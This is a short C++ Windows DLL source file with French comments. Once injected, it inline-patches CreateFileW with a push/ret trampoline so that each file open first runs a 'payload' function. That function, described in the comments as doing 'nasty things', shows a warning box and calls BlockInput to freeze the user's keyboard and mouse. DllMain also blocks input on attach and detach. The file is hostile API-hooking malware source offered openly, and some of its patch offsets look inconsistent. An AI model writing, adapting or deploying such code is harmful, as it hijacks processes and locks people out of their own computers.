#include "stdafx.h"
#include <windows.h>

char* createFile;

__declspec(naked) void payload(){
	// on arrive de CreateFileW
	__asm {
		pushad ; sauvegarde de tous les registres
	}

	// ici on fait les choses méchantes
	MessageBoxA(NULL, "Something is coming...", "Warning", NULL);

	BlockInput(TRUE);
	
	__asm {
		popad ; récupération des registres
		mov edi, edi ; les instructions au début de CreateFileW
		push ebp
		mov ebp, esp
		sub esp, 0x58 ; allocation sur la pile dans CreateFileW
		mov eax, createFile
		add eax, 8
		push eax
		ret
	}
	// on retourne dans CreateFileW

}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	unsigned int payload_address;
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: 
		createFile = (char*) CreateFileW;
		// to change the protection of the memory page to allow writing
		DWORD old;
		VirtualProtect(createFile, 6, PAGE_EXECUTE_READWRITE, &old);
		// to push address of payload in the stack, to
		// patch the CreateFileW function to jump to the hookedCreateFileW function
		createFile[0] = '\x68'; //push, takes 5 bytes
		createFile[5] = '\xc3'; //ret
		payload_address = (unsigned int) payload;
		((unsigned int*)(createFile+1))[0] = payload_address;
	case DLL_THREAD_ATTACH: //chargement d'un thread
	case DLL_THREAD_DETACH: //déchargement d'un thread
	case DLL_PROCESS_DETACH: //fin de la DLL
		MessageBoxA(NULL, "Attention!", "Warning", MB_ICONWARNING |MB_OK);
		BlockInput(TRUE);

		break;
	}
	return TRUE;
}
